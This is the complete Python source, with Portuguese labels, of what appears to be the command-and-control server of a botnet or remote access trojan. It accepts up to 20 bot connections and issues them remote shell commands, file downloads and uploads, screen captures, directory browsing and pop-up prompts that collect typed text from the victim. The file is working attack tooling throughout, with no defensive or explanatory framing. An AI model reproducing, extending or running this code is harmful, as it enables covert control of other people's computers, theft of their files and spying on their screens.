#!/usr/bin/python3
# -*- coding: utf-8 -*-

import socket
import os
import textwrap
import readline
import threading

bot_list = list()
flag = False
send_msg = ""
comandos = [
		"CMD: [Comando do CMD]",
		"DIR: [Diretório]",
		"SCD: [Diretório]",
		"PSC: [Nome da Imagem]",
		"GFL: [Nome do Arguivo]",
		"SFL: [Nome do Arguivo]",
		"LIST",
		"CLOSE",
		"MSG: [(YN)][MENSAGEM]",
		"PPT: [MENSAGEM]"]
		
info_comandos = [
		"Executa um comando do prompt de comando da maquina bot",
		"Lista pastas e arquivos do caminho especificado, use \"DIR:.\" para apontar o diretório atual",
		"Troca o diretório atual pelo espacificado",
		"Captura a imagem da tela do bot em arguivo \".jpeg\" e faz o download do mesmo com o nome espacificado",
		"Faz o download do arguivo especificado da maquina bot",
		"Faz o upload do arguivo espacificado para a maquina bot",
		"Lista os bots conectados no momento",
		"Encerra a comunicação com todos os bots conectados",
        "Exibe uma mensagem em pop-up na tela do bot e espera o click no botão (OK), a opção (YN) pode ser usada para especificar o uso dos botões (YES) e (NO)",
        "Exibe uma mensagem e um prompt em pop-up e retorna a frase escrita no prompt"]


def get_file(file_name,file_size,connection):
		buff = ""
		buff_size = file_size;
		file_write = open( file_name, "wb")
		status = 0.0;
		while buff_size > 0 :
			buff = connection.recv(2048)
			file_write.write(bytes(buff[:buff_size]))
			buff_size = buff_size - len(buff[:buff_size])
			if round((file_size-buff_size)/file_size,2) > status :
				porcent = int(100*(round((file_size-buff_size)/file_size,2)))//4
				print("\033[1;34;40m[\033[0m"+(porcent*"\033[1;34;40m»\033[0m")+((25-porcent)*" ")+"\033[1;34;40m]\033[0m", end= '' if porcent<25 else '\n' )
				status = round((file_size-buff_size)/file_size,2)
		file_write.close()
		return connection.recv(2048)

def set_file(file_name,connection):
	if os.path.exists(file_name):
		file_size = int(os.stat(file_name).st_size)
		buff_size = file_size;
		file_read = open( file_name, "rb")
		status = 0.0;
		connection.send(bytes(str(file_size)+(" "*(2048-len(str(file_size)))),"utf-8"))
		while (buff_size) > 0 :
			buff = file_read.read(buff_size if buff_size<2048 else 2048)
			connection.send(buff)
			buff_size = buff_size - len(buff)
			if round((file_size-buff_size)/file_size,2) > status :
				porcent = int(100*(round((file_size-buff_size)/file_size,2)))//4
				print("\033[1;34;40m[\033[0m"+(porcent*"\033[1;34;40m»\033[0m")+((25-porcent)*" ")+"\033[1;34;40m]\033[0m", end= '' if porcent<25 else '\n' )
				status = round((file_size-buff_size)/file_size,2)
		file_read.close()
	else:
		connection.send(str.encode("0"))
	return connection.recv(2048)
	
class Bot:
	ip = ""
	connection = ""
	name = ""
	def __init__(self,ip,connection):
		self.ip = ip
		self.connection = connection
		self.name = "\033[0;36m"+str(self.connection.recv(2048),'utf-8')+"\033[m"
		
	def send(self,send):
		global bot_list
		try:
			if send[:1] == "[" and send.__contains__("]"):
				if send[1:send.index("]")].split(",").__contains__(str(bot_list.index(self)+1)):
					send = send[send.index("]")+1:]
				else:
					return
			if len(send)<5: 
				return
			self.connection.send(str.encode(send))
			msg = self.connection.recv(2048)
			if send[:4] == "gfl:" and str(msg,"utf-8") != '[Arquivo Inexistente]':
				msg = get_file(str(bot_list.index(self)+1)+"_"+send[4:],int(str(msg,"utf-8")),self.connection)
			elif send[:4] == "sfl:" and len(send)>4 :
				msg = set_file(send[4:],self.connection)
			elif send[:4] == "psc:" and len(send)>4 :
				msg = get_file(str(bot_list.index(self)+1)+"_"+send[4:]+".jpeg",int(str(msg,'utf-8')),self.connection)
			print(self.name+":"+str(msg,'utf-8'))
		except:
			self.connection.close()
			bot_list[bot_list.index(self)] = 0
			print(self.name+":[\033[1;31mDESCONNECTED\033[m]")

def internal_commands(args):
	global bot_list
	args = args.lower()
	if args.strip() == "help":
		l, c = os.popen('stty size', 'r').read().split()
		for comando in comandos:
			wrapper = textwrap.TextWrapper(initial_indent="\033[1m"+comando+"\033[m"+(" "*(25-len(comando))), width=int(c),subsequent_indent=(" "*25))
			print(wrapper.fill(info_comandos[comandos.index(comando)]))
		return True
	elif args.strip() == "list":
		for bot in bot_list:
			print("("+str(bot_list.index(bot)+1)+") Bot "+bot.name+" - "+bot.ip)
		return True
	elif args.strip() == "close":
		for bot in bot_list:
			bot.connection.close()
		bot_list = []
	return False

def wait_bots():
	global bot_list
	while len(bot_list)<20:
		connection, client = server.accept()
		while not flag:
			continue
		bot_list.append(Bot(client[0],connection))
		print("\r"+"\033[1;34m"+os.getlogin()+"\033[m:\033[0;36m["+str(len(bot_list))+"]\033[m» "+readline.get_line_buffer(),end="")

print("\033[1;32m[Starting Server]\033[m")
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("",8080))
server.listen(20)
threading.Thread(target=wait_bots,args=[]).start()
while True:
	flag = True
	while True:
		send_msg = input("\033[1;34m"+os.getlogin()+"\033[m:\033[0;36m["+str(len(bot_list))+"]\033[m» ")
		send_msg = send_msg[:4].lower() + send_msg[4:]
		if not internal_commands(send_msg) : break
	flag = False
	for bot in bot_list:
		bot.send(send_msg)
	for bot in bot_list:
		if bot==0:bot_list.remove(bot)